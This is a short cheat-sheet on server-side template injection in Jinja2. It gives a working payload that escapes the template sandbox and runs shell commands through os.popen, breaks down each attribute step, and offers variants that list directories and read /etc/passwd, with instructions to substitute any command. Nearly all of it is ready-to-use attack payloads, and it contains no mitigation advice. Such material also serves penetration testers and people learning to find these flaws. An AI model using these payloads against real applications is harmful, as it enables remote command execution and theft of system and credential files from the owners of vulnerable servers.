# Jinja2 SSTI Quick Note

## Payload Example

``` jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### What It Does

-   This is a **Server-Side Template Injection (SSTI)** payload for
    **Jinja2**.
-   It escapes the template sandbox and executes system commands.

### Breakdown

-   `self.__init__` → Accesses the initialization method of the template
    object.
-   `__globals__` → Retrieves global variables from the function scope.
-   `__builtins__` → Provides access to Python's built-in functions.
-   `__import__('os')` → Imports the `os` module dynamically.
-   `.popen('id').read()` → Executes the `id` command and reads the
    output.

### Usage

-   Replace `"id"` with any system command:

``` jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}
```

-   Example: Get `/etc/passwd`

``` jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
```

------------------------------------------------------------------------

⚠️ **Note**: This works only if the template engine is unsafely exposing
objects (common in vulnerable Flask/Jinja apps).
